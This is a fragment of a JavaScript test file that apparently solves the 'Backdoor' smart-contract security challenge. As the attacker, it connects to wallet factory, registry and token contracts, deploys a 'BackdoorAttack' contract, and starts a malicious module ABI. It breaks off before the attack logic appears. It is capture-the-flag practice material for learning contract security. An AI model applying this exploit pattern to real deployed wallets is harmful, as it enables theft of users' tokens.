...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    ...
    // connecting
    const TokenAttack = await this.token.connect(attacker);
    const FactoryAttack = await this.walletFactory.connect(attacker);
    const MasterCopyAttack = await this.masterCopy.connect(attacker);
    const WalletAttack = await this.walletRegistry.connect(attacker);

    // deploying attack contract
    const AttackModule = await ethers.getContractFactory(
      "BackdoorAttack",
      attacker
    );
    const attackContract = await AttackModule.deploy(
      attacker.address,
      FactoryAttack.address,
      MasterCopyAttack.address,
      WalletAttack.address,
      TokenAttack.address
    );
    //  call for maliciuos abi

    const moduleABI = [
      "function setupToken(address _tokenAddress, address _attacker)",
    ];
